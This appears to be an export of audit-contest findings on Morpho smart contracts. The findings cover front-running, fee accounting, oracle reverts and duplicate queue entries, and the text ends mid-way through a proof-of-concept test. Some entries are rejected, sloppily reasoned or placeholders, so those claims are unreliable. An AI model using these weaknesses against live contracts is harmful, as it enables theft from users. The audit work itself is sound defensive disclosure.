This presents a challenge because the possiblities of duration which a timelock is measured against is pretty much. 

```
  uint256 internal constant MAX_TIMELOCK = 2 weeks;

    /// @dev The minimum delay of a timelock.
    uint256 internal constant MIN_TIMELOCK = 1 days;
```

A timelock can go from 1 day to about twelve days, in one sweep, and 12days is alot for market condition to change, and for a market which was once favourable to become unfavourable.

And if the affected admin decides to change it it will require one more transaction and that is more gas. 


**Recommendation**

Add a parameter for timelocked functions, that indicates what timelock duration was present at time of sending transaction, and if that state isnt same at execution , then transaction should fail. 




### Can not pay max debt in metamoph	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Decription**

When calling `MorphoBundler.morphoRepay` , 

```
    function morphoRepay(
        MarketParams calldata marketParams,
        uint256 assets,
        uint256 shares,
        uint256 slippageAmount,
        address onBehalf,
        bytes calldata data
    ) external payable protected {
        // Do not check `onBehalf` against the zero address as it's done at Morpho's level.
        require(onBehalf != address(this), ErrorsLib.BUNDLER_ADDRESS);

        // Don't always cap the assets to the bundler's balance because the liquidity can be transferred later
        // (via the `onMorphoRepay` callback).
        if (assets == type(uint256).max) assets = ERC20(marketParams.loanToken).balanceOf(address(this));
        // @audit-issue max here should mean repay max debt, not max of what is sent, so it should rather check what is owed on blue
        // then repay it whatever it the amount maybe, this method used here should be for deposit, not repayment. different style.
        // This is especially important when there is a callback that can release the actual value as said int he comment up by dev. 
        // There is an upper band limit of what can be paid here, if you overpay for a loan it reverts

        _approveMaxTo(marketParams.loanToken, address(MORPHO));

        (uint256 repaidAssets, uint256 repaidShares) = MORPHO.repay(marketParams, assets, shares, onBehalf, data);

        if (assets > 0) require(repaidShares >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);
        else require(repaidAssets <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);
    }
```

It allows the user to pay max of what is sent to the bundler contract, but this should not only be the priority of a repay function, as a need of a user when repaying could be to close its entire postion on Blue, but that might be very deficult as interest and rates accrue at each time change, and when the users repay transaction is finally put into a block and transacted, it might not be the same amount as it supposed to repay, and it owes more, that means now it has to send another transaction, this uint.max should rather be used to pay the max of the users loan, which closes its loan position.

Example, 

Bob intends to close his entire positon as it will be liquidated soon cause the price of the collataral is currently falling, he checks and sees that it will take 20eth to close his entire position, he sends the transaction using the bundler, but when the transaction is included it is after 2 blocks, much later than anticipated, and the interest on his loan has accrued within that time, now he owes more than he estimated due to change in time between submission and execution. He then tries to do this again, until he finally succeeds or is liquidated by a liquidator. 



**REcommendation**

It should give the user the option to close its loan position when it supplies uint as max value. meaning the repay function should accruel on the morpho market, then check what is the asset cost to close entire position, then check if the user has that, then transfer from user account. 




### Should rather swap LSD as opposed to stake as LSD contract is pausable	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**

```
function stakeEth(uint256 amount, uint256 minShares, address referral) external payable protected {
        amount = Math.min(amount, address(this).balance);

        require(amount != 0, ErrorsLib.ZERO_AMOUNT);

        uint256 shares = IStEth(ST_ETH).submit{value: amount}(referral);
        require(shares >= minShares, ErrorsLib.SLIPPAGE_EXCEEDED); 
        // @audit-issue some something about limits in staking or xpensive, 
        // maybe should swwap instead, or is it paused or something,
        // check solodit.
    }
```

```
function wrapStEth(uint256 amount) external payable protected {
        amount = Math.min(amount, ERC20(ST_ETH).balanceOf(address(this)));

        require(amount != 0, ErrorsLib.ZERO_AMOUNT);

        IWstEth(WST_ETH).wrap(amount);
 
    }
```

```
 function unwrapStEth(uint256 amount) external payable protected {
        amount = Math.min(amount, ERC20(WST_ETH).balanceOf(address(this)));

        require(amount != 0, ErrorsLib.ZERO_AMOUNT);

        IWstEth(WST_ETH).unwrap(amount);


    }
```

In the functions above, the LSD contracts are called directly in `StEthBundler` contract, to deposit assets for LSD in return, it should rather just swap those assets for thier LSD equivalent, as the LSD contracts are pausable and also are more expensive to interact with as oppossed to a swap which provides just the same value as interacting with an LSD contract... 

**REcommendation**

Recomendation in the description



### There is no check that the set proof will not expire before the lock expire	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**DEscription**

When setting Root `UniversalRewardsDistributor.SubmitRoot` which is used to claim rewards, 

```
function submitRoot(bytes32 newRoot, bytes32 newIpfsHash) external onlyUpdaterRole {
        require(newRoot != pendingRoot.root || newIpfsHash != pendingRoot.ipfsHash, ErrorsLib.ALREADY_PENDING);


        pendingRoot = PendingRoot({root: newRoot, ipfsHash: newIpfsHash, validAt: block.timestamp + timelock});
         emit EventsLib.PendingRootSet(msg.sender, newRoot, newIpfsHash);
    }
```

It does not check that the proof will still be valid after the lock expires on the root which is used to claim funds, 

```
function claim(address account, address reward, uint256 claimable, bytes32[] calldata proof)
        external
        returns (uint256 amount)
    {
 
        require(root != bytes32(0), ErrorsLib.ROOT_NOT_SET);
        require(
            MerkleProof.verifyCalldata(
                proof, root, keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable))))
            ),
            ErrorsLib.INVALID_PROOF_OR_EXPIRED
        ); 

        require(claimable > claimed[account][reward], ErrorsLib.CLAIMABLE_TOO_LOW);

        amount = claimable - claimed[account][reward];

        claimed[account][reward] = claimable;

        ERC20(reward).safeTransfer(account, amount);

        emit EventsLib.Claimed(account, reward, amount);
       
    }
```

This is because when the root is finally accepted, it used agaainst the root for every claim on users funds when distributing. 

Like so: 

```
 require(
            MerkleProof.verifyCalldata(
                proof, root, keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable))))
            ),
            ErrorsLib.INVALID_PROOF_OR_EXPIRED
        ); 

```


**REcommendation**

The root should be checked that if the set duration ends, it will still be valid. 



## Low risk
### Unhandled revert could lock price oracle access

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Call to `latestRoundData` could potentially revert and make it impossible to query any prices. 

Chainlink's multisigs can immediately block access to price feeds at will. Therefore, to prevent denial of service scenarios, it is recommended to query Chainlink price feeds using a defensive approach with Solidity’s try/catch structure. In this way, if the call to the price feed fails, the caller contract is still in control and can handle any errors safely and explicitly.

This is even more relevant given that arbitrary oracles can be used as long as they comply with Chainlink's interface, which may provide weaker guarantees.

https://github.com/morpho-org/morpho-blue-oracles/blob/ac9b8bac0da4ad56830e6168dbf605bd64be300b/src/libraries/ChainlinkDataFeedLib.sol#L23

```
(, int256 answer,,,) = feed.latestRoundData();
```

**Remediation**

Surround the call to latestRoundData() with try/catch instead of calling it directly. In a scenario where the call reverts, the catch block can be used to call a fallback oracle or handle the error in any other suitable way.




### Quote feed returning a price of zero would cause a revert

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Zero is a valid price that could be returned by an oracle.

https://github.com/morpho-org/morpho-blue-oracles/blob/ac9b8bac0da4ad56830e6168dbf605bd64be300b/src/libraries/ChainlinkDataFeedLib.sol#L24

```
require(answer >= 0, ErrorsLib.NEGATIVE_ANSWER);
```

However, the function price in ChainlinkOracle.sol will consistently revert when a quote feed returns a price of zero.

https://github.com/morpho-org/morpho-blue-oracles/blob/ac9b8bac0da4ad56830e6168dbf605bd64be300b/src/ChainlinkOracle.sol#L116-L121

```
function price() external view returns (uint256) {
    return SCALE_FACTOR.mulDiv(
        VAULT.getAssets(VAULT_CONVERSION_SAMPLE) * BASE_FEED_1.getPrice() * BASE_FEED_2.getPrice(),
        QUOTE_FEED_1.getPrice() * QUOTE_FEED_2.getPrice()
    );
}
```

This is due to mulDiv reverting when called with a zero denominator (see https://github.com/OpenZeppelin/openzeppelin-contracts/blob/932fddf69a699a9a80fd2396fd1a2ab91cdda123/contracts/utils/math/Math.sol#L117-L123).

As a result, no price data will be returned.




### testing will edit	_(this issue has been rejected)_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

test



### Does not account for leap year

**Severity:** Low risk

**Context:** [ConstantsLib.sol#L9-L9](morpho-blue-irm/src/libraries/adaptive-curve/ConstantsLib.sol#L9-L9)

Doesn't account for leap year, should be `365.25 days`, same for the other mentions in this file.



### Duplicate markets in `supplyQueue` will cause `maxDeposit` and `maxMint` to return wrong values

**Severity:** Low risk

**Context:** [MetaMorpho.sol#L322-L337](metamorpho/src/MetaMorpho.sol#L322-L337)

- Description

`maxDeposit` and `maxMint` functions iterate over `supplyQueue` to find the maximum deposit amount for each market, so if there are duplicate markets in `supplyQueue`, the maximum deposit and mint amounts will be more than they should be.

This breaks the [ERC-4626 standard](https://eips.ethereum.org/EIPS/eip-4626) that for `maxDeposit` states:

>MUST return the maximum amount of assets deposit would allow to be deposited for receiver and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary).

- Impact

Protocols that rely on `maxDeposit` and `maxMint` to calculate the maximum deposit and mint amounts for a given market might not work as expected.

- Recommendation

Add a check in `setSupplyQueue` to prevent duplicate markets from being added to `supplyQueue`.



### Incorrect permissions holders on `hasPermission()`	_(duplicate of [`_update` will not allow anyone to hold any tokens])_

**Severity:** Low risk

**Context:** [ERC20PermissionedBase.sol#L50-L50](erc20-permissioned/src/ERC20PermissionedBase.sol#L50-L50)

**Description**:

The comment above the `hasPermission()` function asserts that only MORPHO and Bundler have permissions. This is inaccurate, as `address(0)` also possesses permissions as one can see in the code snippet below:

```solidity
  function hasPermission(address account) public view virtual returns (bool) {
      return account == address(0) || account == MORPHO || account == BUNDLER;
  }
```

**Recommendation**:

Either correct the comment to accurately reflect the default permissions: "@dev By default, Morpho, Bundler, and `address(0)` have permissions." or remove the permissions granted to `address(0)`.



### MetaMorphoFactory can be frontrunned	_(duplicate of [Using CREATE2 with a user-specified `salt` makes `createMetaMorpho()` susceptible to front-running])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Proof of Concept
`MetaMorphoFactory.createMetaMorpho` function allows anyone to create vault. It uses create2 to deploy new contract and `salt` param, provided by user, [is used to deploy contract](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorphoFactory.sol#L51C43-L51C47).

Such call can easily be frontrunned in order to grief deployer and make his tx revert of even with belief that deployer will not notice tx revert and continue working with the deployed contract, where attacker have provided own configuration.
- Impact
Attacker can frontrun user and deploy contract with other configuration to the expected address.

- Recommended Mitigation Steps
You can combine provided salt with `msg.sender` for example to make it unique. Or you can encode all `MetaMorpho` initialization params to create salt. 



### MetaMorpho.maxDeposit will show incorrect result in case if supplyQueue contains duplicates	_(duplicate of [Duplicate markets in `supplyQueue` will cause `maxDeposit` and `maxMint` to return wrong values])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Proof of Concept
`MetaMorpho.maxDeposit` should provide maximum amount of assets, that user can deposit and tx will not revert.

https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L642-L653
```solidity
    function _maxDeposit() internal view returns (uint256 totalSuppliable) {
        for (uint256 i; i < supplyQueue.length; ++i) {
            Id id = supplyQueue[i];

            uint256 supplyCap = config[id].cap;
            if (supplyCap == 0) continue;

            uint256 supplyAssets = MORPHO.expectedSupplyAssets(_marketParams(id), address(this));

            totalSuppliable += supplyCap.zeroFloorSub(supplyAssets);
        }
    }
```
This function loops through all markets in `supplyQueue` and check amount that still can be deposited to reach `config[id].cap`.

Function `setSupplyQueue` allows allocator to provide new array of enabled markets. This function changes `supplyQueue` to new array. The function doesn't check if `newSupplyQueue` contains duplicates and comments above `setSupplyQueue` function say, that indeed it's expected for the contract, [that `newSupplyQueue` will contains duplicates](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L323C67-L324C54).

Comment:
> can contain duplicate markets, but it would only increase the cost of depositing to the vault.

Developers assume that duplicates can not have impact on functionality of contract. However it will have impact on `_maxDeposit` function. In case if `supplyQueue` has duplicates, then amount that can be deposited to reach the market's cap will be used several times, which means that in reality max deposit amount will be smaller than the function will calculate.
- Impact
`MetaMorpho` contract will calculate maxDeposit bigger than it is in reality, which will cause reverts of deposits when user would like to deposit more than real max deposit value.
- Recommended Mitigation Steps
I don't see the reason to have duplicates in `supplyQueue` array. Maybe better to check that all markets there are unique.



### Bad UX on `morphoLiquidate`

**Severity:** Low risk

**Context:** [MorphoBundler.sol#L254-L254](morpho-blue-bundlers/src/MorphoBundler.sol#L254-L254)

**Description**:

Currently, there is no way to use the liquidated funds without having another call to the morpho contract or use the callback. 

E.g.
i liquidated a position which will result in 1 ETH collateral. 

In order to receive this 1 ETH, i must construct a data that will basically do collateral.transfer(receiver) so it can be called within the callback of the morpho liquidation flow.

The other possibility is to use multicall to just deposit collateral and then withdraw it immediately to receive it. 

The ux is a bit counterintuitive and can result in lost assets if by mistake a wrongfully constructed call is created and the collateral remains in the contract after the call is finished. 

I agree that a wrongfully constructed multicall can result in losses of data anyhow in many cases but i wanted to point this one because i believe that the UX can be improved to make the users' life easier.

**Recommendation**:
Consider adding an extra parameter `receiver` and if that parameter is not address(0) then to transfer the collateral directly in the `morphoLiquidate` function. 



### The guardian role cannot be removed from a malicious guardian	_(duplicate of [The guardian can remove the pending guardian, allowing him to maintain control over his role])_

**Severity:** Low risk

**Context:** [MetaMorpho.sol#L460-L460](metamorpho/src/MetaMorpho.sol#L460-L460)

Currently, **Metamorpho.revokePendingGuardian()** can be called by the guardian. This means the current guardian can stop all future attempts to remove this role from his account. This is mentioned in the Metamorpho docs (and this is the reason why I am submitting this as a Low), but I don't think a guardian should be able to call this function. Consider allowing only the owner to call it.



###  2 TX bundlers may be vounerable 

**Severity:** Low risk

**Context:** [ERC4626Bundler.sol#L47-L47](morpho-blue-bundlers/src/ERC4626Bundler.sol#L47-L47)

- Summary
The current implementation of the ERC4626Bundler presents a potential security vulnerability, as it requires two separate transactions for the bundler to function. This opens up an opportunity for attackers to insert their transaction between the user's fund transfer to the bundler and the subsequent trade, allowing them to steal the tokens.

- Proof of Concept
The ERC4626Bundler, as evidenced in [this code snippet](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L53-L72), operates by depositing tokens into a vault. The issue arises because the tokens must be sent before the [erc4626Deposit](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L53-L72) function can be called. This necessitates two transactions: 
1. The user transferring funds to the bundler
2. The user calling [erc4626Deposit](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L53-L72).

However, this two-step process creates a window of vulnerability between the two transactions, allowing an attacker to execute their own [erc4626Deposit](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L53-L72) transaction and illicitly deposit the funds for personal gain.

- Recommended Solution
Given that I am not a developer and lack insight into the intended functionality, I defer to the development team for devising an appropriate fix. It is imperative for the developers to address this security concern and implement a solution that ensures the bundler's operation remains secure and impervious to such potential exploits.



### Centralization risk - Curator can enforce certain market usage over others

**Severity:** Low risk

**Context:** [MetaMorpho.sol#L286-L287](metamorpho/src/MetaMorpho.sol#L286-L287)

Curator can enforce certain market over other markets by increasing cap to max. This will cause all deposits to curator chosen market, thus bringing centralization risk

- Recommendation
Place a max cap over the maximum allowed supplyCap for a market



### User will be paying duplicate fees

**Severity:** Low risk

**Context:** [MetaMorpho.sol#L917-L917](metamorpho/src/MetaMorpho.sol#L917-L917)

In case of Market removal and reallocation of removed market asset, User will have to pay duplicate fees

Steps:
1. Lets say currently totalAssets were 100 which sets lastTotalAssets to 100 (Assuming fees for 100 is added to fee recipient)
2. Market M1 with supplyAsset of 20 was marked for removal and is removed which decreases the totalAssets to 100-20=80 (since M1 is removed from withdrawQueue now)
3. So once `_updateLastTotalAssets` is called, lastTotalAssets gets updated to 80
4. Allocator allocates funds of M1 to another existing market say M2
5. This increases the totalAssets back to 100
6. This means _accureFees is called, User has to again pay fees for amount 20 (totalAssets(100)-lastTotalAssets(80))
7. This is wrong since User has already paid this fees while depositing in market M1

Recommendation
On removing the market from withdrawQueue, all its asset should be transferred to next available market



### Anyone can claim for you

**Severity:** Low risk

**Context:** [UniversalRewardsDistributor.sol#L115-L115](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L115-L115)

- Summary
Any user can claim the rewards for other users, even if they didn't want them now.

- Proof of concept
`claim` calculates it's node with the help of  `account`, `reward` and `claimable`. This means that everyone can input a valid account (even if not theirs) to send them the reward. In the future this might be an issue as some users might want to keep their rewards unclaimed and claim them at a given point in time.

- Recommendation
 Instead of `account` use `msg.sender`.
```diff
-   function claim(address account, address reward, uint256 claimable, bytes32[] calldata proof)
+   function claim( address reward, uint256 claimable, bytes32[] calldata proof)
        external
        returns (uint256 amount)
    {
        require(root != bytes32(0), ErrorsLib.ROOT_NOT_SET);
        require(
            MerkleProof.verifyCalldata(
-               proof, root, keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable))))
+               proof, root, keccak256(bytes.concat(keccak256(abi.encode(msg.sender, reward, claimable))))
            ),
            ErrorsLib.INVALID_PROOF_OR_EXPIRED
        );
```



### Assumption Vulnerability in UtilsLib: Missing Check for `low <= high`

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Severity

LOW

- Relevant GitHub Links

[GitHub Repository Code](https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/UtilsLib.sol#L11)

- Summary

In the `UtilsLib` library, a notable observation is the lack of a crucial `require` check within the `bound` function. This function assumes that the input parameter `low` is less than or equal to `high`. Without this check, users could potentially input a value for `low` that exceeds the `high` input, resulting in unexpected and unintended behavior.

- Vulnerability Details

The `bound` function lacks a check for the assumption `low <= high`. This omission can lead to unexpected behavior and potential vulnerabilities if the assumption is violated.

- Impact

- Incorrect output when `low` is greater than `high`.
- Security vulnerabilities or weakened contract integrity.
- Unpredictable behavior affecting dependent contract logic.
- Debugging challenges in identifying the root cause of issues.

- Tools Used

- Manual Review

- Recommendations

Implement a `require` check at the beginning of the `bound` function to ensure that `low` is less than or equal to `high`. This will prevent unexpected behavior and enhance the security and reliability of the `bound` function.

```solidity
function bound(int256 x, int256 low, int256 high) internal pure returns (int256 z) {
    require(low <= high, "UtilsLib: low must be less than or equal to high");

    assembly {
        // z = min(x, high).
        z := xor(x, mul(xor(x, high), slt(high, x)))
        // z = max(z, low).
        z := xor(z, mul(xor(z, low), sgt(low, z)))
    }
}




### Converting `feeShares` with `newTotalAssets-feeAssets` is not same rate used with the system

**Severity:** Low risk

**Context:** [MetaMorpho.sol#L923-L923](metamorpho/src/MetaMorpho.sol#L923-L923)

**Description**:
When users deposit or mint assets simultaneously, the `feeRecipient` receives a distinct rate compared to other users. It's crucial to note that the system currently does not update `newTotalAssets` after computing feeShares. However, during minting for the fee recipient, the rate is modified.

**Recommendation**:
Consider either updating `newTotalAssets` by subtracting the `feeAssets` or ensuring a uniform rate for all users. This adjustment will promote consistency in the treatment of users during the deposit/minting process.```




### In drastic situation, if the curator attempts to set the new cap to zero when the existing `pending cap=0` ,it reverts

**Severity:** Low risk

**Context:** [MetaMorpho.sol#L298-L298](metamorpho/src/MetaMorpho.sol#L298-L298), [MetaMorpho.sol#L791-L791](metamorpho/src/MetaMorpho.sol#L791-L791)

**Description:**
There may be a situation where `pendingCap` is zero, and the curator intends to set `newSupplyCap` to zero due to adverse market conditions. However, attempting to set the cap to zero results in a revert, as the pending cap is already zero.

Example:
- Alice, the curator
  - t0: On November 8, Alice sets the cap to 1000.
  - t1: On November 8, at 11:59, Alice observes a market downturn and attempts to set the cap to 0, resulting in a transaction revert due to the zero pending cap.

**Recommendation:**
To address this issue, it is recommended to avoid deleting `pendingCap` each time the cap is submitted, as this unintended action prevents setting the cap to zero in scenarios where it is necessary, such as during market downturns. Adjustments should be made to allow setting the cap to zero under these circumstances.



### Metamorpho receives less fees when removes market with non-zero supply

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Impact
Metamorpho doesn't accrue fee after removing the market with non-zero supply. For example if market with MetaMorpho's supply on it 500 was removed, then fee won't accrue for the next 500 of interest.

- Description
I'll explain 2 different pieces to combine in the end
1) Metamorpho.sol has variable `lastTotalAssets` which is used to track accrued interest, because part of that interest belongs to feeRecipient. For example if current `totalAssets()` is 500, `lastTotalAssets` is 300, and fee is 10%; then protocol fee is `(500 - 300) * 10% = 20`. If `lastTotalAssets > totalAssets()`, it means that bad debt was socialized, therefore `totalAssets` reduced. In this case fee is not accrued until `lastTotalAssets` becomes less than `totalAssets()`:
https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L914-L925
```solidity
    function _accruedFeeShares() internal view returns (uint256 feeShares, uint256 newTotalAssets) {
        newTotalAssets = totalAssets();

        uint256 totalInterest = newTotalAssets.zeroFloorSub(lastTotalAssets);
@>      if (totalInterest != 0 && fee != 0) {
            uint256 feeAssets = totalInterest.mulDiv(fee, WAD);
            // The fee assets is subtracted from the total assets in this calculation to compensate for the fact
            // that total assets is already increased by the total interest (including the fee assets).
            feeShares =
                _convertToSharesWithTotals(feeAssets, totalSupply(), newTotalAssets - feeAssets, Math.Rounding.Floor);
        }
    }
```

2. There is array `withdrawQueue`. It can be updated via `updateWithdrawQueue()` such that new queue is permutation of previous without removed markets.
```solidity
    /// @notice Sets the withdraw queue as a permutation of the previous one, although markets with both zero cap and
    /// zero vault's supply can be removed from the permutation.
    /// @notice This is the only entry point to disable a market.
    /// @notice Removing a market requires the vault to have 0 supply on it; but anyone can supply on behalf of the
    /// vault so the call to `sortWithdrawQueue` can be griefed by a frontrun. To circumvent this, the allocator can
    /// simply bundle a reallocation that withdraws max from this market with a call to `sortWithdrawQueue`.
    /// @param indexes The indexes of each market in the previous withdraw queue, in the new withdraw queue's order.
    function updateWithdrawQueue(uint256[] calldata indexes) external onlyAllocatorRole {
```

Let's observe in detail how market is removed. If Metamorpho has supply on that market, it checks timelock and then removes market from `config`. 
https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L364-L380
```solidity
        for (uint256 i; i < currLength; ++i) {
            if (!seen[i]) {
                Id id = withdrawQueue[i];

                if (config[id].cap != 0) revert ErrorsLib.InvalidMarketRemovalNonZeroCap(id);

@>              if (MORPHO.supplyShares(id, address(this)) != 0) {
                    if (config[id].removableAt == 0) revert ErrorsLib.InvalidMarketRemovalNonZeroSupply(id);

                    if (block.timestamp < config[id].removableAt) {
                        revert ErrorsLib.InvalidMarketRemovalTimelockNotElapsed(id);
                    }
                }

                delete config[id];
            }
        }
```

3. After removing market with non-zero supply in step 2, `totalAssets()` will return lower result than before. Because it loops through `withdrawQueue`:
https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L613-L617
```solidity
    function totalAssets() public view override returns (uint256 assets) {
        for (uint256 i; i < withdrawQueue.length; ++i) {
            assets += MORPHO.expectedSupplyAssets(_marketParams(withdrawQueue[i]), address(this));
        }
    }
```

That's it: after removing market with non-zero supply, current `totalAssets` will become less than before. Due to described condition in step 1, protocol fee will stop to accrue. For example:
1) Metamorpho has supply 500 on Market1 and 500 on Market2.
2) Currently `lastTotalAssets = 1000`, `actualTotalAssets = 1000`
3) Market2 was removed via timelock
4) Now `lastTotalAssets = 1000`, `actualTotalAssets = 500`. It means that protocol fee won't accrue for the next 500 of interest

- Recommendation
It must reduce `lastTotalAssets` by the amount of supplied assets on removed market. To keep variables consistent, it should accrue fee in `updateWithdrawQueue()`:
```diff
    function updateWithdrawQueue(uint256[] calldata indexes) external onlyAllocatorRole {
+       uint256 newTotalAssets = _accrueFee();
+       if (newTotalAssets > lastTotalAssets) {
+           _updateLastTotalAssets(newTotalAssets);
+       }

        uint256 newLength = indexes.length;
        uint256 currLength = withdrawQueue.length;

        bool[] memory seen = new bool[](currLength);
        Id[] memory newWithdrawQueue = new Id[](newLength);

        for (uint256 i; i < newLength; ++i) {
            uint256 prevIndex = indexes[i];

            // If prevIndex >= currLength, it will revert with native "Index out of bounds".
            Id id = withdrawQueue[prevIndex];
            if (seen[prevIndex]) revert ErrorsLib.DuplicateMarket(id);
            seen[prevIndex] = true;

            newWithdrawQueue[i] = id;
        }

        for (uint256 i; i < currLength; ++i) {
            if (!seen[i]) {
                Id id = withdrawQueue[i];

                if (config[id].cap != 0) revert ErrorsLib.InvalidMarketRemovalNonZeroCap(id);

                if (MORPHO.supplyShares(id, address(this)) != 0) {
                    if (config[id].removableAt == 0) revert ErrorsLib.InvalidMarketRemovalNonZeroSupply(id);

                    if (block.timestamp < config[id].removableAt) {
                        revert ErrorsLib.InvalidMarketRemovalTimelockNotElapsed(id);
                    }
+                   uint256 marketAssets = MORPHO.expectedSupplyAssets(id, address(this));
+                   _updateLastTotalAssets(lastTotalAssets.zeroFloorSub(marketAssets));
                }

                delete config[id];
            }
        }

        withdrawQueue = newWithdrawQueue;

        emit EventsLib.SetWithdrawQueue(_msgSender(), newWithdrawQueue);
    }
```




### BaseBundler.multicall() lacks to check that the ETH balance of address(this) is zero at the end.	_(duplicate of [ Lack of proper sanity check in multical leading to lock or misplacement of funds. ])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
BaseBundler.multicall() lacks to check that the ETH balance of address(this) is zero at the end. Such a check  is important since the multicall() will initiate several delegate call, which means they will also use the same ``msg.value`` in each delegate call. There is no guarantee that all the ETH sent into address(this) will be used up at the end of the call.

Without such a call scenario like this will happen: 

1) User1  calls multicall() and then leave 1 ETH In the contract due to no such check.
2) User 2 calls multicall() and then use the 1 ETH left in the contract and thus steal that 1ETH.

**Recommendation**:

Add a check to ensure after the completion of the mutlicall, the balance of address(this) is zero.

```diff
 function multicall(bytes[] memory data) external payable {
        require(_initiator == UNSET_INITIATOR, ErrorsLib.ALREADY_INITIATED);

        _initiator = msg.sender;

        _multicall(data);

        _initiator = UNSET_INITIATOR;

+     require(address(this).balance == 0, "you have left some ETH In the contract.");
    }

```



### MetaMorpho._maxDeposit() will return the wrong value when there is duplicate in supplyQueue.	_(duplicate of [Duplicate markets in `supplyQueue` will cause `maxDeposit` and `maxMint` to return wrong values])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

MetaMorpho._maxDeposit() will return the wrong value when there is duplicate in supplyQueue. Duplicate will occur when a market is deleted and added back again since during market removal, it will be removed only from withdrawQueue, but not from supplyQueue.


**Description**:
MetaMorpho._maxDeposit() will return the wrong value when there is duplicate in supplyQueue. This is because the cap of the market will be double counted when the market occurs twice in the supplyQueue. 

```javascript
function _maxDeposit() internal view returns (uint256 totalSuppliable) {
        for (uint256 i; i < supplyQueue.length; ++i) {
            console2.log("i:", i);
            Id id = supplyQueue[i];
            console2.log("id:");
            console2.logBytes32(Id.unwrap(id));


            uint256 supplyCap = config[id].cap;
            console2.log("suplyCap:", supplyCap);
            
            if (supplyCap == 0) continue;

            uint256 supplyAssets = MORPHO.expectedSupplyAssets(_marketParams(id), address(this));

            totalSuppliable += supplyCap.zeroFloorSub(supplyAssets);
        }
    }
```

Meanwhile, duplicates will occur when a market is removed and then added back. Since when a removal of a market occurs, it is accomplished by function updateWithdrawQueue(), which only removes the market from withdrawQueue, but not from supplyQueue. When a market is added back, it will be added both to withdrawQueue and again to the supplyQueue, leading to duplicates. The function setupSupplyQueue() also allows duplicate as suggested in the comment "newSupplyQueue is an array of enabled markets, and can contain duplicate markets, but it would only increase the cost of depositing to the vault.". 


My following POC confirms my finding. Market0 is removed and then added back, leading to duplicate in supplyQueue. When we have 1 ether , 2ether and 3 ether as the caps for the three markets, and after a supply of 3.3 ether, we are supposed to return a maxDeposit of 1+2+3 - 3.3 = 2.7 ether. However, 3.7 ether was returned as the result since market0 is double counted in maxDeposit().

```javascript

// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {IERC20Errors} from "../../lib/openzeppelin-contracts/contracts/interfaces/draft-IERC6093.sol";
import {IMorphoFlashLoanCallback} from "../../lib/morpho-blue/src/interfaces/IMorphoCallbacks.sol";

import "./helpers/IntegrationTest.sol";

import {Math} from "openzeppelin-contracts/contracts/token/ERC20/extensions/ERC4626.sol";

contract MyTest is IntegrationTest, IMorphoFlashLoanCallback {
    using MorphoBalancesLib for IMorpho;
    using MorphoLib for IMorpho;
    using MarketParamsLib for MarketParams;

    Id[] marketIds = new Id[](3);

    address john = makeAddr("john");

    function setUp() public override virtual {
        super.setUp();                          // the first is an idle market?
        _setFee(0);

 
        for(uint256 i; i < 3; i++){        // use the first three markets
             _setCap(allMarkets[i], (i+1) * 1e18);
             marketIds[i] = allMarkets[i].id();
        }

        vm.prank(ALLOCATOR);
        vault.setSupplyQueue(marketIds);
        
        // _sortSupplyQueueIdleLast();
        console2.log("vault supply queue length:", vault.supplyQueueLength());
        console2.log("vault withdraw queue length:", vault.withdrawQueueLength());
    }

    
    function onMorphoFlashLoan(uint256, bytes memory) external {
        assertEq(vault.maxWithdraw(ONBEHALF), 0);
    }

    
    function testMaxDeposit() public{       // wrong when there is duplidate in the supplyQueue. 
        // we start with three markets, markete0, market1, market2
        assertEq(vault.withdrawQueueLength(), 3);

        // 1. SUPPLIER supplies 3.3e18
        uint256 assets = 3.3e18; // 1 for market 0, 2, for market 1, and 0.3 for market 2
        uint256 shares = vault.convertToShares(assets);
        loanToken.setBalance(SUPPLIER, assets);
        vm.prank(SUPPLIER);
        vault.mint(shares, SUPPLIER);

        // 2. CURATOR set the cap for market0 to zero
        vm.prank(CURATOR);        
        vault.submitCap(allMarkets[0], 0); // this will be in effect immediately
